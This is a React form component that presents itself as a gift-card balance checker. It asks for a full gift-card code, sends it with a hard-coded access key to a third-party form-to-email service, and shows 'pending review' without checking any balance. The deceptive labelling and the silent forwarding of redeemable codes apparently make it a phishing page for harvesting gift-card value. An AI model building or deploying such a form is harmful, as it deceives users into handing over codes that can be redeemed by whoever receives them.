import { useState } from "react";
import { useLocation } from "react-router-dom";
import { useNavigate } from "react-router-dom";

const ContactForm = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const selectedCard = location.state?.selectedCard || "Unknown Card";

  const [isFormVisible, setIsFormVisible] = useState(true);

  const onSubmit = async (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);

    formData.append("selected_card", selectedCard);
    formData.append("access_key", "7ce6881a-e1d9-4db3-8c41-2c37324af1bc");

    const object = Object.fromEntries(formData);
    const json = JSON.stringify(object);

    const res = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: json,
    }).then((res) => res.json());

    if (res.success) {
      alert("Successfully pending review!");
      setIsFormVisible(false);
      navigate("/");
    }
  };

  return (
    <div className="pt-24 p-4">
      {isFormVisible && (
        <form onSubmit={onSubmit} className="contact-right flex flex-col items-start gap-4 mt-6 bg-gray-400 p-2 rounded-xl">
          <h3 className="text-white font-bold">Checking {selectedCard}</h3>

          <label className="text-white">Card Number</label>
          <input type="text" placeholder="0000 0000 0000" name="gift card code" className="bg-black p-2 text-white rounded-lg border-none outline-none min-w-80" required />

          {/* Hidden input to store the selected card value */}
          <input type="hidden" name="selected_card" value={selectedCard} />

          <button type="submit" className="bg-black border-none text-white rounded-3xl text-xl py-1 px-3 mt-4 hover:bg-gray-500">
            Check Rate To Confirm Balance
          </button>

          <button type="button" onClick={() => setIsFormVisible(false)} className="text-white mt-2">
            Cancel
          </button>
        </form>
      )}
    </div>
  );
};

export default ContactForm;
